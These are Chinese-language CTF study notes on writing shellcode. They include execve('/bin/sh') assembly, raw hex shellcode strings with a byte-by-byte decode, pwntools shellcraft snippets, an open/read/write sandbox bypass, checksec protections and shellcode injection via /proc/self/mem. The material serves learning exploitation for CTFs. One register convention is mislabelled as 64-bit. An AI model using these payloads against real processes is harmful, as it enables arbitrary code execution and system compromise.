# Shellcode

## 概念

冯诺依曼架构把代码和数据等同的，而哈佛架构设计上就把代码和数据隔离开来。
当今几乎所有架构，例如`x86, ARM, MIPS, PPC(power pc), SPARC(Scalable Processor Architecture,risc架构, etc`，都是冯诺依曼架构。
哈佛架构只被用在`AVR, PIC`里
当冯诺依曼架构中，因为数据和代码是混合在一起的，这就导致了`shellcode`的产生
这使得**用户输入(data)被作为代码(code)执行**成为可能。

## shellcode利用与编写

shellcode**利用的目标就是达成任意命令执行**,而一个经典的攻击模式就是启动`shell`:`execve("/bin/sh", NULL, NULL)`

```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 59		# this is the syscall number of execve
lea rdi, [rip+binsh]	# points the first argument of execve at the /bin/sh string below
mov rsi, 0		# this makes the second argument, argv, NULL
mov rdx, 0		# this makes the third argument, envp, NULL
syscall			# this triggers the system call
binsh:				# a label marking where the /bin/sh string is
.string "/bin/sh"
```

shellcode利用的常见命令：
```asm
1. Assembling shellcode:
gcc -nostdlib -static shellcode.s -o shellcode-elf

2. Extracting shellcode:
objcopy --dump-section .text=shellcode-raw shellcode-elf

3. Disassembling shellcode:
objdump -M intel -d shellcode-elf

4. Sending shellcode to the stdin of a process (with user input afterwards):
cat shellcode-raw /dev/stdin | /vulnerable_process

5. Strace a program with your shellcode as input:
cat shellcode-raw | strace /vulnerable_process

6. Debug a program with your shellcode as input:
gdb /vulnerable_process
(gdb) r < shellcode-raw
```

当然`pwntools`也是可以编写`shellcode`的
例如获取执行`system(“/bin/sh”)`的机器码：
```python
from pwn import *  
context(log_level='debug'，arch='i386'，os='linux')  #x86架构，若为x64架构则arch参数改为amd64
shellcode=asm(shellcraft.sh())
```


另外一些shellcode可以用别人写好的，例如exploit-db。用搜索引擎检索别人写好的可以直接来用的 shellcode。  
sh对应的shellcode:
```cpp
shellcode = "\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"
```

在ctf-wiki的stack pivoting上看到的shellcode:
```python
shellcode_x86 = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73" 
shellcode_x86 += b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0" 
shellcode_x86 += b"\x0b\xcd\x80"
```
- `31 c9`  
    `xor ecx, ecx`  
    把 `ecx` 置零（ecx = 0）。
    
- `f7 e1`  
    `mul ecx`  
    乘法指令：`eax := eax * ecx`（edx:eax = eax * ecx）。因为 `ecx == 0`，结果将 `eax` 清为 `0`。这里的目的是把 `eax` 清零（等价于 `xor eax,eax`，只是写法不同）。
    
- `51`  
    `push ecx`  
    把 0（之前置好的）压到栈上，作为字符串末尾的 NUL（`\x00`），用于终止 `/bin//sh` 字符串。
    
- `68 2f 2f 73 68`  
    `push 0x68732f2f` （立即数是小端存放）  
    在栈上压入字节序 `2f 2f 73 68`，也就是 ASCII `"/ / s h"` → 实际内存为 `"//sh"`。（写作 `//sh`，和 `/sh` 等价，但便于对齐与避免 NUL。）
    
- `68 2f 62 69 6e`  
    `push 0x6e69622f`  
    将 `"/bin"` 压入栈（字节序 `2f 62 69 6e`）。
    
    此时栈上顺序为（低地址→高地址）： `"/bin" "/ /sh" 0x00` 合在一起就是 `"/bin//sh\x00"`。
    
- `89 e3`  
    `mov ebx, esp`  
    把 `ebx` 指向栈上的字符串地址（`ebx` = 指向 `/bin//sh`），作为 `execve` 第一个参数 `char *filename`。
    
- `b0 0b`  
    `mov al, 0x0b`  
    将 `eax` 的低字节设为 11（`execve` 在 i386 上的系统调用号是 11，即 `0xb`）。
    
- `cd 80`  
    `int 0x80`  
    发起系统调用。`execve("/bin//sh", NULL, NULL)` 被执行，进程会尝试用 `/bin/sh` 替换当前进程，得到 shell。
## 常见的Shellcode功能

- Unix
    
    - execve /bin/sh
        
    - port-binding
        
    - reverse shell
        
    - setuid
        
    - breaking chroot
        
    
- Windows
    
    - WinExec
        
    - Reverse shell using CreateProcess cmd.exe

## ForbiddenBytes

编写shellcode的时候不总是一帆风顺，即使你碰到了可以写入shellcode的漏洞，在利用漏洞之前，可能程序对输入做了限制，这里就需要一些其他的`trick`

### 常见的限制

某些字符在某些函数下会被截断，导致shellcode被截断:  

|Byte (Hex Value)|Problematic Methods|
|---|---|
|Null byte \0 (0x00)|strcpy|
|Newline \n (0x0a)|scanf gets getline fgets|
|Carriage return \r (0x0d)|scanf|
|Space (0x20)|scanf|
|Tab \t (0x09)|scanf|
|DEL (0x7f)|protocol-specific (telnet, VT100, etc)|

注意：在x64架构下，使用pwntools执行`system(“/bin/sh”)`的机器码会有很多0，若有0特判或者其他特判，可将之前的代码改为：
```python
from pwn import *  
context(log_level='debug'，arch='amd64'，os='linux')
shellcode=asm(shellcraft.cat('flag'))  
```

### orw变式

针对一些开了沙箱的题目，只能调用orw(open，read，write)这三个函数或者其他一些影响不大的函数，反正就是没有cat和system还有execve，那么我们就要用这三个函数来搞，思想就是用open函数打开flag这个文件，然后用read读入到程序中，在用write输出到我们屏幕上

```lua
1.open(‘/flag’)
2.read(3,buf,0x100)
3.write(1,buf,0x100)
```

其中0x100都是读入输出大小，第一个参数1和3是读入和输出的位置，buf是程序的一段地址要求可读可写，可以去ida找，找到后就可以用pwntools直接生成了

```python
sh=shellcraft.open('flag')
sh+=shellcraft.read(3，buf，0x100)
sh+=shellcraft.write(1，buf，0x100)
sh=asm(sh)
```

# int80软中断

第一步，就是需要将系统调用号加入到eax中。  
第二步，ebx保存函数调用的第一个参数，ecx、edx、esi、edi分别对应这2345个参数。(Linux 64位)

如果参数超过5个，就必须将参数数组存储到内存中，而且必须将该数组的地址放在ebx中。  
一旦加载寄存器后，就会调用int 0x80汇编指令来中断，强迫内核暂停手头上的工作并处理该中断。

## checksec查看的各项保护的含义
【1】RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表。

【2】Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过。

【3】NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的callesp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过。

【4】PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址。

【5】FORTIFY：FORTIFY_SOURCE机制对格式化字符串有两个限制，一是包含%n的格式化字符串不能位于程序内存中的可写地址；二是当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1，2，3，4，5和6。


## /proc/self/
读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。

/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。


结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。
同样的，我们也可以通过写入mem文件来直接写入内存，例如直接修改代码段，放入我们的shellcode，从而在程序流程执行到这一步时执行shellcode来拿shell。